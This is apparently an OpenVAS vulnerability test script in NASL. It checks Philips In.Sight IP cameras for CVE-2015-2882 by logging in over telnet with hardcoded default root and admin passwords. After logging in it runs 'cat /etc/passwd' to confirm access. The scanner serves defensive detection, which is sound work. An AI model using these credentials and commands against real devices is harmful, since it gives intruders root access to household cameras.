###############################################################################
# OpenVAS Vulnerability Test
# $Id: sw_philips_insight_default_telnet_credentials.nasl 13624 2019-02-13 10:02:56Z cfischer $
#
# Philips In.Sight Default Telnet Credentials
#
# Authors:
# Christian Fischer
#
# Copyright:
# Copyright (c) 2016 SCHUTZWERK GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111096");
  script_version("$Revision: 13624 $");
  script_cve_id("CVE-2015-2882");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Philips In.Sight Default Telnet Credentials");
  script_tag(name:"last_modification", value:"$Date: 2019-02-13 11:02:56 +0100 (Wed, 13 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-04-24 12:00:00 +0200 (Sun, 24 Apr 2016)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2016 SCHUTZWERK GmbH");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/philips/in_sight/detected");

  script_xref(name:"URL", value:"http://www.ifc0nfig.com/a-close-look-at-the-philips-in-sight-ip-camera-range/");
  script_xref(name:"URL", value:"https://www.rapid7.com/docs/Hacking-IoT-A-Case-Study-on-Baby-Monitor-Exposures-and-Vulnerabilities.pdf");

  script_tag(name:"summary", value:"The remote Philips In.Sight Device has default credentials set.");

  script_tag(name:"impact", value:"This issue may be exploited by a remote attacker to gain
  access to sensitive information or modify system configuration.");

  script_tag(name:"vuldetect", value:"Connect to the telnet service and try to login with default credentials.");

  script_tag(name:"insight", value:"It was possible to login with default credentials of root:b120root, root:insightr, admin:/ADMIN/ or mg3500:merlin");

  script_tag(name:"solution", value:"The vendor has released an updated firmware disabling the telnet access.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("telnet_func.inc");
include("misc_func.inc");

report = 'It was possible to login using the following credentials:\n';

port = get_telnet_port(default:23);
banner = get_telnet_banner( port:port );
if( !banner || "insight login" >!< banner )
  exit(0);

creds = make_array( "root", "b120root",
                    "rooT", "insightr",
                    "admin", "/ADMIN/",
                    "mg3500", "merlin" );

foreach cred ( keys( creds ) ) {

  soc = open_sock_tcp( port );
  if( ! soc ) exit( 0 );

  recv = recv( socket:soc, length:2048 );

  if ( "insight login" >< recv ) {

    send( socket:soc, data: tolower( cred ) + '\r\n' );
    recv = recv( socket:soc, length:128 );

    if( "Password:" >< recv ) {
      send( socket:soc, data: creds[cred] + '\r\n\r\n' );
      recv = recv( socket:soc, length:1024 );

      files = traversal_files("linux");

      foreach pattern( keys( files ) ) {

        file = files[pattern];

        send( socket:soc, data: 'cat /etc/passwd\r\n' );
        recv = recv( socket:soc, length:1024 );

        if( egrep( string:recv, pattern:pattern ) ) {
          report += '\n' + tolower( cred ) + ":" + creds[cred];
          VULN = TRUE;
          break;
        }
      }
    }
  }
  close( soc );
}

if( VULN ) {
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );